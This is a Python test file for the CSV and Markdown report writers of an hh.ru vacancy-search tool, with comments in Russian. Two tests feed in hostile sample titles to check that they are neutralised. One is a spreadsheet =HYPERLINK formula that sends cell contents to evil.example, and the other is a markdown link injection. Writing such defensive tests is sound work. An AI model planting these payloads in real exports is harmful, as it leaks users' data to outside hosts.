import csv
import re
from datetime import UTC, datetime
from pathlib import Path

import pytest

from hh_search.domain.models import (
    DiscoveredVacancy,
    Salary,
    ScoreBreakdown,
    ScoredVacancy,
    VacancyDetails,
)
from hh_search.sinks import build_sinks
from hh_search.sinks.csv_sink import COLUMNS, CsvSink
from hh_search.sinks.markdown_sink import SNIPPET_LENGTH, MarkdownSink

# Данные тестов повторяют то, что приходит из хранилища: даты — aware UTC с
# микросекундами (`storage/time_utils.py`), а зарплата и дата публикации
# могут отсутствовать честно (листинг их не отдаёт, а на странице вакансии
# блока зарплаты может не быть вовсе).
NOW = datetime(2026, 7, 27, 10, 0, tzinfo=UTC)
PUBLISHED = datetime(2026, 7, 27, 6, 21, 20, 933000, tzinfo=UTC)
SALARY = Salary(raw="от 200 000 ₽", amount_from=200000, currency="₽")


def make_scored(
    vacancy_id: str = "1",
    title: str = "Embedded Engineer",
    total: float = 87.4,
    cluster: str = "embedded",
    company: str | None = "ООО Ромашка",
    area: str | None = "Нижний Новгород",
    salary: Salary = SALARY,
    published_at: datetime | None = PUBLISHED,
    description: str = "Требуется опыт Yocto и BSP.",
) -> ScoredVacancy:
    return ScoredVacancy(
        discovered=DiscoveredVacancy(
            id=vacancy_id,
            url=f"https://hh.ru/vacancy/{vacancy_id}",
            title=title,
            company=company,
            area=area,
            salary=salary,
            published_at=published_at,
            found_by_query="programmist",
        ),
        details=VacancyDetails(description=description),
        score=ScoreBreakdown(
            title=1.0,
            stack=0.8,
            responsibilities=0.5,
            domain=1.0,
            penalty=0.0,
            total=total,
            matched={"stack": ["yocto"]},
        ),
        cluster=cluster,
    )


def read_rows(path: Path) -> list[dict[str, str]]:
    with path.open(encoding="utf-8-sig", newline="") as handle:
        return list(csv.DictReader(handle, delimiter=";"))


# --- CSV: второго шанса не будет ------------------------------------------


def test_csv_row_carries_every_column(tmp_path: Path) -> None:
    """Сравнивается словарь ЦЕЛИКОМ, а не три поля из двенадцати.

    После `mark_reported()` вакансия навсегда уходит из `unreported()`:
    колонка, которую приёмник не записал, потеряна окончательно —
    переотправки нет по построению (спека §5.2).
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    rows = read_rows(tmp_path / "2026-07-27-new.csv")
    assert rows == [
        {
            "id": "1",
            "score": "87.4",
            "cluster": "embedded",
            "title": "Embedded Engineer",
            "company": "ООО Ромашка",
            "area": "Нижний Новгород",
            "salary_from": "200000",
            "salary_to": "",
            "currency": "₽",
            "published_at": "2026-07-27 06:21",
            "listing": "programmist",
            "url": "https://hh.ru/vacancy/1",
        }
    ]


def test_csv_opens_in_excel(tmp_path: Path) -> None:
    """BOM и `;` — не вкус, а условие читаемости.

    Без BOM Excel читает UTF-8 как cp1251 и показывает `ÐžÐžÐž`; с русской
    локалью разделителем списка является `;`, и файл с запятыми целиком
    ложится в первую колонку.
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    raw = (tmp_path / "2026-07-27-new.csv").read_bytes()
    assert raw.startswith(b"\xef\xbb\xbf")
    header = raw.decode("utf-8-sig").splitlines()[0]
    assert header == ";".join(COLUMNS)


def test_csv_appends_second_run_without_repeating_header_or_bom(tmp_path: Path) -> None:
    """Второй прогон дня дописывает, а не начинает файл заново — и не
    вставляет второй BOM: кодек utf-8-sig пишет его при каждом открытии."""
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    sink.emit([make_scored(vacancy_id="2")], NOW)
    path = tmp_path / "2026-07-27-new.csv"
    assert [row["id"] for row in read_rows(path)] == ["1", "2"]
    assert path.read_text(encoding="utf-8-sig").count("\ufeff") == 0


def test_csv_neutralizes_formula_written_by_the_employer(tmp_path: Path) -> None:
    """Заголовок вакансии — внешний недоверенный текст: его пишет
    работодатель. Квотирование модуля csv от формул не защищает."""
    title = '=HYPERLINK("http://evil.example/?u="&A1;"вакансия")'
    CsvSink(tmp_path).emit(
        [make_scored(title=title, company="+7 (999) 123-45-67 — Embedded Linux")], NOW
    )
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["title"] == f"'{title}"
    assert row["company"] == "'+7 (999) 123-45-67 — Embedded Linux"


def test_csv_leaves_unknown_date_and_salary_empty(tmp_path: Path) -> None:
    """`published_at` необязателен, а блока зарплаты на странице может не
    быть вовсе. В отчёте это пустые ячейки, а не строка `None` и не падение."""
    CsvSink(tmp_path).emit([make_scored(published_at=None, salary=Salary())], NOW)
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["published_at"] == ""
    assert (row["salary_from"], row["salary_to"], row["currency"]) == ("", "", "")


# --- Markdown: порог меняет подробность, а не состав ----------------------


def test_markdown_splits_top_and_rest_by_threshold(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Хорошая вакансия", total=87.4),
            make_scored(vacancy_id="2", title="Так себе вакансия", total=42.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Хорошая вакансия") < text.index("## Остальное")
    assert text.index("## Остальное") < text.index("Так себе вакансия")


def test_markdown_keeps_a_vacancy_exactly_at_the_threshold_in_top(tmp_path: Path) -> None:
    """Спека §6.3 фиксирует `>=`: вакансия на пороге РОВНО идёт в «Топ».

    Разница между `>` и `>=` — это ровно те вакансии, для которых порог и
    подбирался, поэтому строгий знак был бы тихой потерей подробностей.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(title="Ровно порог", total=60.0)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Ровно порог") < text.index("## Остальное")
    assert "_ничего выше порога_" not in text


def test_markdown_orders_top_by_score_descending(tmp_path: Path) -> None:
    """Внутри кластера — от лучшего к худшему: отчёт читают сверху."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Похуже", total=70.0),
            make_scored(vacancy_id="2", title="Получше", total=90.0),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Получше") < text.index("Похуже")


def test_markdown_groups_top_by_cluster(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Первая", total=90.0, cluster="embedded"),
            make_scored(vacancy_id="2", title="Вторая", total=80.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "### embedded" in text
    assert "### backend" in text
    assert "https://hh.ru/vacancy/1" in text


def test_markdown_full_entry_shows_company_area_and_salary(tmp_path: Path) -> None:
    """Три поля, за которые заплачено запросом к странице вакансии. Без них
    «Топ» приходится открывать по ссылке, чтобы понять, стоит ли открывать."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · Нижний Новгород · от 200 000 ₽" in text


def test_markdown_says_the_salary_is_unknown_when_the_page_had_none(tmp_path: Path) -> None:
    """Ветка достижима: блока `data-qa="vacancy-salary"` на странице может не
    быть — это обычный случай, а не ошибка (спека §3.4)."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(salary=Salary(), area=None)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · — · зарплата не указана" in text


def test_markdown_truncates_the_snippet(tmp_path: Path) -> None:
    """Описание с hh.ru — это килобайты текста: без обрезки «Топ» перестаёт
    быть выжимкой и читается дольше, чем сама страница вакансии."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(description="я" * 500)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "я" * SNIPPET_LENGTH + "…" in text
    assert "я" * (SNIPPET_LENGTH + 1) not in text


def test_markdown_collapses_line_breaks_from_the_description(tmp_path: Path) -> None:
    """Описание приходит со страницы многострочным (`html_to_text` ставит
    переводы строк на месте блочных тегов). Пустая строка внутри пункта —
    это конец пункта для любого рендерера markdown."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(description="Требуется опыт.\n\nYocto и BSP.")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "Требуется опыт. Yocto и BSP.…" in text


def test_markdown_appends_the_second_run_of_the_day(tmp_path: Path) -> None:
    """Прогон идёт раз в несколько часов: 'w' затирал бы утренние находки
    вечерними, и вернуть их было бы нечем — `mark_reported` уводит вакансию
    из `unreported()` навсегда."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW)
    sink.emit([make_scored(vacancy_id="2", title="Вечерняя")], NOW.replace(hour=18))
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("# Новые вакансии") == 2
    assert "Утренняя" in text
    assert "Вечерняя" in text


def test_markdown_escapes_link_syntax_from_the_employer(tmp_path: Path) -> None:
    """Заголовок пишет работодатель, и `[Удалённо]` в его начале на hh.ru
    встречается. Незакрытая скобка превращает пункт отчёта в рабочую ссылку
    на чужой сайт."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(title="[Удалённо] Инженер](https://evil.example)")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert r"\[Удалённо\]" in text
    # Единственная настоящая ссылка в отчёте — на hh.ru.
    assert re.findall(r"(?<!\\)\]\((http[^)]+)\)", text) == ["https://hh.ru/vacancy/1"]


# --- фабрика и пустой вход ------------------------------------------------


def test_sinks_do_nothing_on_empty_input(tmp_path: Path) -> None:
    CsvSink(tmp_path).emit([], NOW)
    MarkdownSink(tmp_path, threshold=60.0).emit([], NOW)
    assert list(tmp_path.iterdir()) == []


def test_build_sinks_resolves_names(tmp_path: Path) -> None:
    sinks = build_sinks(["csv", "markdown"], tmp_path, threshold=60.0)
    assert [sink.name for sink in sinks] == ["csv", "markdown"]


def test_build_sinks_rejects_unknown_name_before_anything_is_written(tmp_path: Path) -> None:
    """Опечатка в `sinks` обязана ронять процесс на старте, до сетевых
    запросов (спека §7/§9), поэтому фабрика строится до `start_run()` и
    отказывает, ничего не создав."""
    with pytest.raises(ValueError, match="telegram"):
        build_sinks(["csv", "telegram"], tmp_path, threshold=60.0)
    assert list(tmp_path.iterdir()) == []


# --- дедупликация: доставка at-least-once по построению -------------------


def test_csv_does_not_repeat_a_vacancy_already_in_todays_file(tmp_path: Path) -> None:
    """Пересекающиеся наборы двух emit дают файл БЕЗ дублей.

    `sinks: [csv, markdown]` по умолчанию, а `mark_reported()` вызывается
    ПОСЛЕ всех приёмников. Упавший markdown при отработавшем csv оставляет
    вакансии `new`, и следующий прогон отдаёт csv тот же список второй раз
    (замер ревью Task 10: «ДУБЛИ в CSV: 20 шт.»); авария контейнера между
    `emit` и `mark_reported` даёт ровно то же. Доставка at-least-once
    неустранима, поэтому дубли снимает приёмник — по факту записанного.
    """
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1"), make_scored(vacancy_id="2")], NOW)
    sink.emit([make_scored(vacancy_id="2"), make_scored(vacancy_id="3")], NOW)
    assert [row["id"] for row in read_rows(tmp_path / "2026-07-27-new.csv")] == ["1", "2", "3"]


def test_csv_writes_nothing_when_the_whole_batch_is_already_in_the_file(tmp_path: Path) -> None:
    """Полный повтор не добавляет к файлу ни байта."""
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    before = (tmp_path / "2026-07-27-new.csv").read_bytes()
    sink.emit([make_scored(vacancy_id="1")], NOW)
    assert (tmp_path / "2026-07-27-new.csv").read_bytes() == before


def test_csv_deduplicates_by_the_file_not_by_the_sink_instance(tmp_path: Path) -> None:
    """Источником истины обязан быть файл, а не состояние в памяти:
    между прогонами процесс перезапускается, и множество отправленного,
    накопленное в приёмнике, не переживает ни рестарт контейнера, ни
    падение `serve` посреди итерации."""
    CsvSink(tmp_path).emit([make_scored(vacancy_id="1")], NOW)
    CsvSink(tmp_path).emit([make_scored(vacancy_id="1")], NOW)
    assert [row["id"] for row in read_rows(tmp_path / "2026-07-27-new.csv")] == ["1"]


def test_markdown_does_not_repeat_a_vacancy_already_in_todays_file(tmp_path: Path) -> None:
    """То же для markdown, но искать приходится по вписанным ссылкам:
    структурированного поля с id в отчёте для человека нет."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Первая"), make_scored(vacancy_id="2")], NOW)
    sink.emit([make_scored(vacancy_id="2"), make_scored(vacancy_id="3", title="Третья")], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("https://hh.ru/vacancy/1") == 1
    assert text.count("https://hh.ru/vacancy/2") == 1
    assert text.count("https://hh.ru/vacancy/3") == 1


def test_markdown_writes_no_empty_section_when_the_whole_batch_repeats(tmp_path: Path) -> None:
    """Иначе вечерний прогон дописывал бы «# Новые вакансии» с пустыми
    разделами: отчёт читают глазами, и такой хвост — это шум."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    before = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    sink.emit([make_scored(vacancy_id="1")], NOW.replace(hour=18))
    assert (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8") == before


def test_markdown_dedup_is_not_fooled_by_a_link_from_the_employer(tmp_path: Path) -> None:
    """Ссылку в отчёт может вписать работодатель — заголовком вида
    `Инженер](https://hh.ru/vacancy/2)`. Экранирование делает её текстом, и
    дедупликация обязана считать его текстом тоже, иначе чужой заголовок
    прячет настоящую вакансию из следующего отчёта."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Инженер](https://hh.ru/vacancy/2)")], NOW)
    sink.emit([make_scored(vacancy_id="2", title="Настоящая вторая")], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "Настоящая вторая" in text


def test_markdown_dedup_survives_a_title_ending_with_a_backslash(tmp_path: Path) -> None:
    """Обратный слэш в конце заголовка не должен прятать СВОЮ ссылку.

    `_escape` удваивает его, и перед закрывающей скобкой нашей ссылки
    оказывается `\\`: одиночный lookbehind `(?<!\\)` принял бы её за
    экранированную работодателем, дедупликация потеряла бы id, и
    следующий прогон вписал бы вакансию второй раз. Поэтому слэши
    считаются парами — экранирован лишь тот `]`, перед которым их
    нечётное число.
    """
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Инженер C++ \\")], NOW)
    sink.emit([make_scored(vacancy_id="1", title="Инженер C++ \\")], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("https://hh.ru/vacancy/1") == 1
